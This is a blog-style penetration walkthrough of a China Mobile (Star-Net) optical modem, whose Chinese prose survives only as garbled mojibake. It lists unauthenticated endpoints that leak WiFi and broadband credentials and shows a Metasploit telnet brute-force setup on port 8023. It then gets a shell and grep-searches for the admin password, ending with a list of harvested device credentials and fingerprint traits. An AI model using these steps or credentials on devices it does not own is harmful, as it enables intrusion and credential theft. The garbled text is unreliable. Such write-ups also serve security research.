I"î <h1 id="å‰è¨€">å‰è¨€</h1>

<p>è¿‡ä¸ªå¹´ï¼ŒWiFiå¯†ç å¿˜è®°äº†â€¦å…‰çŒ«ç®¡ç†å¯†ç ä¹Ÿå¿˜è®°äº†ï¼ˆè¿™ä¸ªå…‰çŒ«ä¹Ÿä¸æ”¯æŒç‰©ç†æŒ‰é’®é‡ç½®è®¾ç½®ï¼‰ï¼Œä½†æ˜¯æ‰‹æœºè¿˜è¿ç€WiFiï¼Œæ­£è§„æ“ä½œæ‰¾å›ä¸äº†å¯†ç ï¼Œé‚£å°±ç”¨å’±ä»¬æµ‹è¯•çš„æ€ç»´æ¥è¯•è¯•PWNæ‰è¿™ä¸ªè·¯ç”±å™¨ã€‚</p>

<h1 id="è¿‡ç¨‹">è¿‡ç¨‹</h1>

<h2 id="æœªæˆæƒè·å–wifiè¿æ¥å¯†ç ">æœªæˆæƒè·å–WiFiè¿æ¥å¯†ç </h2>

<p>è¿˜å¥½ä¹‹å‰æ²¡é—²ç€ï¼Œå‘ç°ç®¡ç†çš„å‡ ä¸ªæœªæˆæƒè®¿é—®çš„æ¥å£å¦‚ä¸‹:</p>

<p>è·å–å®½å¸¦è´¦å·å¯†ç : <code class="language-plaintext highlighter-rouge">/GET_USER_WAN_PPP_INFO.json</code></p>

<p>è·å– WLAN è¿æ¥ä¿¡æ¯: <code class="language-plaintext highlighter-rouge">/GET_WLAN_LINK_INFO.json</code></p>

<p>è·å– DHCP ä¿¡æ¯: <code class="language-plaintext highlighter-rouge">/GET_NET_DHCP_INFO.json</code></p>

<p>æ‰‹æœºè®¿é—® <code class="language-plaintext highlighter-rouge">http://192.168.1.1/GET_WLAN_LINK_INFO.json</code> ï¼Œè·å–å¯†ç ï¼šxxxï¼Œç”µè„‘è¿æ¥ç™»å½•</p>

<h2 id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</h2>

<h3 id="ç«¯å£æ”¶é›†ç»“æœ">ç«¯å£æ”¶é›†ç»“æœ</h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Scanning promote.cache-dns.local <span class="o">(</span>192.168.1.1<span class="o">)</span> <span class="o">[</span>1080 ports]
Discovered open port 80/tcp on 192.168.1.1
Discovered open port 8080/tcp on 192.168.1.1
</code></pre></div></div>

<h3 id="ç›®å½•æ‰«æç»“æœ">ç›®å½•æ‰«æç»“æœ</h3>

<p>è·å¾—çš„ä¸€äº›ç›®å½•ï¼š</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/login.html
/login.asp
/index.asp
/telnet.asp
/upgrade.asp
...
</code></pre></div></div>

<h2 id="çªç ´å£">çªç ´å£</h2>

<p>åœ¨ç›®å½•æ‰«æçš„æ—¶å€™ï¼Œå‘ç°<code class="language-plaintext highlighter-rouge">/telnet.asp</code> -&gt; è·³è½¬åˆ° <code class="language-plaintext highlighter-rouge">/cgi-bin/telnet.asp</code> å¦‚ä¸‹å›¾æ‰€ç¤ºç•Œé¢ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/cmcc-pentest/open_telnet.png" alt="open_telnet" /></p>

<p>è¿™ä¸ªåŠŸèƒ½å¯ä»¥å¼€å¯å…‰çŒ«çš„<code class="language-plaintext highlighter-rouge">telnet</code>æœåŠ¡ï¼Œå…ˆå¼€å¯ï¼Œç„¶åå†ä½¿ç”¨Nmapæ‰«æä¸‹ç«¯å£ï¼š</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Scanning promote.cache-dns.local <span class="o">(</span>192.168.1.1<span class="o">)</span> <span class="o">[</span>1080 ports]
Discovered open port 8080/tcp on 192.168.1.1
Discovered open port 80/tcp on 192.168.1.1
Discovered open port 8023/tcp on 192.168.1.1
</code></pre></div></div>

<p>å‘ç°å¤šäº†ä¸ª8023ç«¯å£ï¼Œå…¶å¯¹åº”çš„æœåŠ¡æœç„¶æ˜¯telnetï¼š</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>8023/tcp open  telnet
| fingerprint-strings:
|   GenericLines:
|     Star-Net Broadband Router
|     Login:
|     Password:
|   GetRequest:
|     Star-Net Broadband Router
|     Login: GET / HTTP/1.0
|     Password:
|   Help:
|     HELP
|     Star-Net Broadband Router
|     Login: Password:
|   NCP:
|     Star-Net Broadband Router
|     Login: DmdT^@^@^@
|     ^@^@^@^A^@^@^@^@^@
|   NULL:
|     Star-Net Broadband Router
|     Login:
|   RPCCheck:
|     Star-Net Broadband Router
|     Login:
|     ^@^@<span class="o">(</span>r
|   SIPOptions:
|     Star-Net Broadband Router
|     Login: OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm<span class="p">;</span><span class="nv">branch</span><span class="o">=</span>foo
|     From: &lt;sip:nm@nm&gt;<span class="p">;</span><span class="nv">tag</span><span class="o">=</span>root
|     &lt;sip:nm2@nm2&gt;
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: &lt;sip:nm@nm&gt;
|     Accept: application/sdp
|     Password:
|   tn3270:
|     ^@IBM-3279-4-E
|     ^YStar-Net Broadband Router
|_    Login:
</code></pre></div></div>

<p>telnetå¼€å¯ï¼Œçˆ†ç ´ä¸€æ³¢èµ°èµ·ã€‚ï¼ˆCaimimaç”Ÿæˆä¸ªå¯†ç å£ä»¤ï¼‰</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/cmcc-pentest/caimima.png" alt="caimima" /></p>

<p>è¯•äº†nmapè²Œä¼¼æ²¡å•¥ç”¨ï¼Œå¼€ä¸ªmsfconsoleæ¥çˆ†ç ´ï¼š</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/scanner/telnet/telnet_login
<span class="nb">set </span>RHOSTS 192.168.1.1 <span class="c">#è®¾ç½®æ¨¡æ¿</span>
<span class="nb">set </span>RPORT 8023 <span class="c">#è®¾ç½®ç«¯å£</span>
<span class="nb">set </span>USER_FILE /root/user.txt <span class="c">#è®¾ç½®ç”¨æˆ·å­—å…¸</span>
<span class="nb">set </span>PASS_FILE /root/pass.txt <span class="c">#è®¾ç½®å¯†ç å­—å…¸</span>
exploit 192.168.1.1 <span class="c">#å¯åŠ¨</span>
</code></pre></div></div>

<p>å¹¸è¿çš„æ˜¯çˆ†ç ´å‡ºæ¥äº†ï¼Œæ˜¯ç»„åˆå¼±å£ä»¤ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/cmcc-pentest/telnet_brute.png" alt="telnet_brute" /></p>

<h2 id="è·å–å¯†ç ">è·å–å¯†ç </h2>

<p>è¿è¡Œ<code class="language-plaintext highlighter-rouge">telnet 192.168.1.1 8023</code>è¾“å…¥è´¦å·å¯†ç è¿›å»ï¼Œæ‰§è¡Œ<code class="language-plaintext highlighter-rouge">sh</code>å‘ç°å¯ä»¥ç›´æ¥è¿›å…¥shellï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/cmcc-pentest/telnet_shell.png" alt="telnet_shell" /></p>

<p>æ¥ä¸‹æ¥å°±æ˜¯æ‰¾å¯†ç åˆ°å¤„çç¿»ï¼ˆæ²¡æœ‰PWNè·¯ç”±å™¨çš„ç»éªŒï¼Œå¾ˆéš¾å—ï¼‰ï¼Œæ‰§è¡Œ <code class="language-plaintext highlighter-rouge">ls -a -l</code> å‘ç°æœ‰è½¯é“¾æ¥ï¼Œå¾ˆå¤šæŒ‡å‘äº†<code class="language-plaintext highlighter-rouge">/tmp</code>ç›®å½•ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/cmcc-pentest/ls.png" alt="ls" /></p>

<p>äºæ˜¯è¿›å…¥<code class="language-plaintext highlighter-rouge">/tmp</code>ç›®å½•ï¼Œåˆ°å¤„ç¿»è…¾ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/cmcc-pentest/tmp.png" alt="tmp" /></p>

<p>åˆ©ç”¨è¿™å‡ ä¸ªå…³é”®è¯çœ‹çœ‹æ˜¯å¦æœ‰æ–‡ä»¶ä¸­åŒ…å«äº†ï¼š<code class="language-plaintext highlighter-rouge">admin</code>ã€<code class="language-plaintext highlighter-rouge">CMCC</code>(ä¸­å›½ç§»åŠ¨)ã€<code class="language-plaintext highlighter-rouge">password</code>ã€<code class="language-plaintext highlighter-rouge">user</code></p>

<p>e.g. <code class="language-plaintext highlighter-rouge">grep 'admin' ./*</code>ï¼Œç­‰äº†è€åŠå¤©äº†ï¼Œå‘ç°<code class="language-plaintext highlighter-rouge">/tmp/ctromfile.cfg</code>æ–‡ä»¶å†…æœ‰ç‚¹ä¸œè¥¿ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/cmcc-pentest/admin.png" alt="admin" /></p>

<p>å¤åˆ¶å¯†ç ç™»å½•ï¼Œæ€¼è¿›å»ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/cmcc-pentest/cmccadmin.png" alt="cmccadmin" /></p>

<h2 id="ä¿¡æ¯æ•´åˆ">ä¿¡æ¯æ•´åˆ</h2>

<p>åšå®Œæµ‹è¯•å¹¶é’ˆå¯¹æµ‹è¯•è¿‡ç¨‹çš„ä¿¡æ¯è¿›è¡Œæ•´åˆï¼Œæœ€åå½¢æˆå­—å…¸ä»¥ä¾¿åé¢å†æ¬¡é‡åˆ°ï½</p>

<ul>
  <li>
    <p>é€šè¿‡è¯»é…ç½®æ–‡ä»¶è·å–çš„ä¸€ç³»åˆ—ç”¨æˆ·åã€å¯†ç ï¼š<code class="language-plaintext highlighter-rouge">9vvrrã€adminã€aDm8H%MdAã€CMCCAdminã€telnetuserã€user</code></p>
  </li>
  <li>æ–‡ä»¶ã€ç›®å½•è·¯å¾„ï¼š
    <ul>
      <li><code class="language-plaintext highlighter-rouge">/GET_USER_WAN_PPP_INFO.json</code></li>
      <li><code class="language-plaintext highlighter-rouge">/GET_WLAN_LINK_INFO.json</code></li>
      <li><code class="language-plaintext highlighter-rouge">/GET_NET_DHCP_INFO.json</code></li>
      <li><code class="language-plaintext highlighter-rouge">/telnet.asp</code></li>
      <li><code class="language-plaintext highlighter-rouge">/index.asp</code></li>
      <li><code class="language-plaintext highlighter-rouge">/user.html</code></li>
      <li><code class="language-plaintext highlighter-rouge">/upgrade.asp</code></li>
      <li><code class="language-plaintext highlighter-rouge">/cgi-bin/</code></li>
      <li><code class="language-plaintext highlighter-rouge">/content.asp</code></li>
    </ul>
  </li>
  <li>æŒ‡çº¹ç‰¹å¾ï¼š
    <ul>
      <li>æ ‡é¢˜ï¼š<code class="language-plaintext highlighter-rouge">HGU LOGIN</code></li>
      <li>å›¾ç‰‡ï¼š<code class="language-plaintext highlighter-rouge">/webstyle/images/login-mobile-qrcode-anhui.png -&gt; 23cb4f5e63e0cd47f8788a6ca3558eab</code></li>
      <li>JSï¼š<code class="language-plaintext highlighter-rouge">/webstyle/js/br_login_nc.js</code></li>
    </ul>
  </li>
</ul>

<h1 id="ç»“å°¾">ç»“å°¾</h1>

<p>æœ€åæˆ‘åªæ˜¯é»˜é»˜çš„æŠŠuserç”¨æˆ·å¯†ç æ”¹äº†ä¸€ä¸‹ï½</p>
:ET